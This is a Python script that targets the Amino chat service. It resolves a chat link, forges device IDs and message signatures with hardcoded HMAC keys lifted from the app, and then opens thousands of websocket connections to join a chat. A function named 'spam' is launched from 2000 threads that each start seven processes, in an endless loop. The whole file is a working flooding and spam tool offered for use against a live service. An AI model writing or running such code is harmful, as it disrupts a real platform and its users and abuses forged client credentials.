link = "http://aminoapps.com/p/av8dzy"


import os
import requests
import threading
import time
import multiprocessing as ms
import hashlib
import hmac
import base64
from uuid import uuid4
import sys
from base64 import b64encode


import websocket
import json


def deviceID():
	identifier = os.urandom(20)
	return ("19" + identifier.hex() + hmac.new(bytes.fromhex("E7309ECC0953C6FA60005B2765F99DBBC965C8E9"), b"\x19" + identifier, hashlib.sha1).hexdigest()).upper()


def NDCMSGSIG(data: str):
    return base64.b64encode(
        bytes.fromhex("19") + hmac.new(bytes.fromhex("dfa5ed192dda6e88a12fe12130dc6206b1251e44"),data.encode(),hashlib.sha1).digest()).decode()


headers = {"NDCDEVICEID": deviceID(),"Accept": "*/*","NDCLANG": "ar","Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-GB,3n;q=0.9","Content-Type": "application/json","User-Agent":"Apple iPad6,12 iPadOS v15.4.1 Main/3.14.0","Connection":"keep-alive"}


def get_cid_chatid(mhat):
	global link
	return requests.get(f"https://service.aminoapps.com/api/v1/g/s/link-resolution?q={link}",headers = headers).json()


path = get_cid_chatid(mhat=get_cid_chatid)
data = path['linkInfoV2']['extensions']
comId = int(data["linkInfo"]['ndcId'])
chatId = data["linkInfo"]["objectId"]


print(f"THE COMID : {comId}")
print(f"THE CHATID : {chatId}")


class WebSocketClient:
    def __init__(self):
        self.socket_url = "wss://ws1.narvii.com"
        final = f"{deviceID()}|{int(time.time() * 1000)}"
        self.extra_headers = {
            "NDCDEVICEID": deviceID(),
            "NDC-MSG-SIG": NDCMSGSIG(data=final)
        }
        self.websocket = websocket.WebSocketApp(
            f"{self.socket_url}/?signbody={final.replace('|', '%7C')}",
            header=self.extra_headers,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close
        )
    
    def on_open(self,ws):
        print("WebSocket connection opened")
        data = {
            "o": {
                "ndcId": int(comId),
                "threadId": chatId,
                "joinRole": 2,
                "id": "72446",
            },
            "t": 112,
        }
        time.sleep(2)
        self.websocket.send(json.dumps(data))
    
    def on_message(self, ws, message):
        print(f"Received message")
    
    def on_error(self, ws, error):
    	pass
    
    def on_close(self, ws):
        print("WebSocket connection closed")
    
    def run(self):
        self.websocket.on_open = self.on_open
        self.websocket.run_forever()

def spam():
    websocket_client = WebSocketClient()
    websocket_client.run()


def main():
	if __name__ == '__main__' :
		p1= ms.Process(target=spam())
		p2= ms.Process(target=spam())
		p3= ms.Process(target=spam())
		p4= ms.Process(target=spam())
		p5= ms.Process(target=spam())
		p6= ms.Process(target=spam())
		p7= ms.Process(target=spam())
		p1.start()
		p2.start()
		p3.start()
		p4.start()
		p5.start()
		p6.start()
		p7.start()


while True:
    for i in range(2000):
    	threading.Thread(target=main).start()
    time.sleep(300)